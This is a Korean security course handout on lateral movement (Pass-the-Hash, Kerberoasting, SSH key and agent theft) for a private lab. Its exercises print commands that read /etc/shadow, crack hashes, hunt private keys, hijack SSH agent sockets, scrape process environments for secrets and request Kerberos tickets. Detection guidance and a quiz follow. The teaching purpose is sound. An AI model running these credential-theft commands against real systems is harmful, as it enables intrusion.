# Week 04: 측면 이동 심화 — Pass-the-Hash, Kerberoasting, 토큰 위조

## 학습 목표
- 측면 이동(Lateral Movement, TA0008)의 목적과 주요 기법을 이해한다
- Pass-the-Hash(PtH) 공격의 원리를 실습하고 탐지 방법을 익힌다
- Kerberos 인증 프로토콜의 취약점과 Kerberoasting 공격을 수행할 수 있다
- 토큰 위조/탈취를 통한 권한 상승 기법을 이해한다
- 측면 이동에 대한 효과적인 탐지 및 방어 전략을 수립할 수 있다

## 선수 지식
- 공방전 기초 과정 이수
- Week 02-03 침투 및 C2 채널 이해
- Windows 인증 메커니즘(NTLM, Kerberos) 기본 개념

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 공격 기지 | `ssh opsclaw@10.20.30.201` |
| web | 10.20.30.80 | 초기 침투 호스트 | `sshpass -p1 ssh web@10.20.30.80` |
| secu | 10.20.30.1 | 네트워크 모니터링 | `sshpass -p1 ssh secu@10.20.30.1` |
| siem | 10.20.30.100 | SIEM 탐지 | `sshpass -p1 ssh siem@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 측면 이동 이론 및 인증 프로토콜 | 강의 |
| 0:40-1:10 | Pass-the-Hash 실습 | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | Kerberoasting 실습 | 실습 |
| 2:00-2:40 | 토큰 위조 및 SSH 키 탈취 실습 | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:30 | 탐지 전략 토론 + 퀴즈 | 토론 |

---

# Part 1: 측면 이동 이론 (40분)

## 1.1 측면 이동이란?

측면 이동(Lateral Movement)은 초기 침투한 시스템에서 **내부 네트워크의 다른 시스템으로 이동**하여 공격 범위를 확대하는 기법이다.

```
[초기 침투] → [자격증명 수집] → [측면 이동] → [고가치 자산 접근]
   web           메모리/파일        PtH/SSH        DB/DC/Admin
```

## 1.2 주요 측면 이동 기법

| 기법 | ATT&CK ID | 프로토콜 | 필요 조건 |
|------|-----------|---------|----------|
| Pass-the-Hash | T1550.002 | NTLM | NTLM 해시 |
| Pass-the-Ticket | T1550.003 | Kerberos | TGT/TGS |
| Kerberoasting | T1558.003 | Kerberos | 도메인 계정 |
| SSH Hijacking | T1563.001 | SSH | SSH 에이전트 |
| Remote Services | T1021 | SSH/RDP | 자격증명 |

## 1.3 NTLM vs Kerberos 인증

```
NTLM 인증 흐름:
클라이언트 → 서버: "인증 요청"
서버 → 클라이언트: Challenge (난수)
클라이언트 → 서버: Response (해시(Challenge + NTLM_Hash))
→ 해시만 알면 평문 비밀번호 없이 인증 가능 (Pass-the-Hash)

Kerberos 인증 흐름:
클라이언트 → KDC: AS-REQ (인증 요청)
KDC → 클라이언트: AS-REP + TGT
클라이언트 → KDC: TGS-REQ + TGT
KDC → 클라이언트: TGS-REP + Service Ticket
클라이언트 → 서비스: Service Ticket
```

---

# Part 2: Pass-the-Hash 실습 (30분)

## 실습 2.1: Linux 환경 해시 추출 및 재사용

> **목적**: 자격증명 탈취 후 해시를 이용한 인증을 수행한다
> **배우는 것**: 해시 추출, 크래킹, 재사용 공격

```bash
# /etc/shadow에서 해시 추출 (root 권한 필요)
cat /etc/shadow | grep -v '!' | grep -v '*'

# John the Ripper로 해시 크래킹
unshadow /etc/passwd /etc/shadow > /tmp/combined.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/combined.txt

# SSH 키 탈취를 통한 측면 이동
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
find /home -name "authorized_keys" -exec cat {} \; 2>/dev/null
```

## 실습 2.2: 메모리에서 자격증명 추출

> **목적**: 프로세스 메모리에서 평문 자격증명을 추출한다
> **배우는 것**: 메모리 포렌식, 자격증명 보호 필요성

```bash
# SSH 에이전트 소켓 탈취
ls -la /tmp/ssh-*/agent.*
SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.YYYY ssh target@10.20.30.100

# 환경변수에서 자격증명 탐색
strings /proc/*/environ 2>/dev/null | grep -i "pass\|token\|key\|secret"
```

---

# Part 3: Kerberoasting 실습 (40분)

## 3.1 Kerberoasting 원리

Kerberos 서비스 티켓은 **서비스 계정의 비밀번호 해시**로 암호화된다. 공격자는 서비스 티켓을 요청한 후 오프라인으로 크래킹할 수 있다.

## 실습 3.1: 서비스 계정 열거 및 티켓 요청

> **목적**: SPN(Service Principal Name)을 열거하고 Kerberoasting을 수행한다
> **배우는 것**: Kerberos 프로토콜 약점, 오프라인 크래킹

```bash
# Impacket을 이용한 Kerberoasting (AD 환경)
python3 -m impacket.examples.GetUserSPNs \
  -dc-ip 10.20.30.50 -request \
  'DOMAIN/user:password'

# 해시 크래킹
hashcat -m 13100 -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

---

# Part 4: 탐지 및 방어 (40분)

## 4.1 측면 이동 탐지 지표

| 탐지 포인트 | 로그 소스 | 이상 패턴 |
|------------|----------|----------|
| 비정상 로그인 | auth.log | 출발지 IP 변경, 시간대 이상 |
| SSH 키 변경 | auditd | authorized_keys 수정 |
| 크래킹 시도 | fail2ban | 다수 실패 후 성공 |
| 내부 스캔 | Suricata | ARP/포트 스캔 트래픽 |

```bash
# OpsClaw로 측면 이동 탐지 자동화
curl -X POST http://localhost:8000/projects/{id}/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {"order":1,"instruction_prompt":"grep -i \"Accepted\\|Failed\" /var/log/auth.log | tail -50","risk_level":"low","subagent_url":"http://10.20.30.80:8002"},
      {"order":2,"instruction_prompt":"find /home -name authorized_keys -newer /etc/os-release","risk_level":"low","subagent_url":"http://10.20.30.80:8002"}
    ],
    "subagent_url":"http://localhost:8002"
  }'
```

---

## 검증 체크리스트
- [ ] NTLM과 Kerberos 인증의 차이를 도식으로 설명할 수 있다
- [ ] Pass-the-Hash 공격의 원리와 Linux 환경 적용을 이해한다
- [ ] SSH 키 탈취를 통한 측면 이동을 수행할 수 있다
- [ ] Kerberoasting의 공격 흐름을 설명할 수 있다
- [ ] 측면 이동에 대한 탐지 규칙을 3가지 이상 작성할 수 있다

## 자가 점검 퀴즈
1. Pass-the-Hash가 가능한 이유를 NTLM 인증 흐름 관점에서 설명하시오.
2. Kerberoasting 방어를 위한 서비스 계정 관리 방안 3가지를 제시하시오.
3. SSH Agent Forwarding의 보안 위험은 무엇이며, 대안은?
4. 측면 이동을 탐지하기 위해 네트워크 세그멘테이션이 중요한 이유를 설명하시오.
5. Golden Ticket과 Silver Ticket의 차이점을 서술하시오.
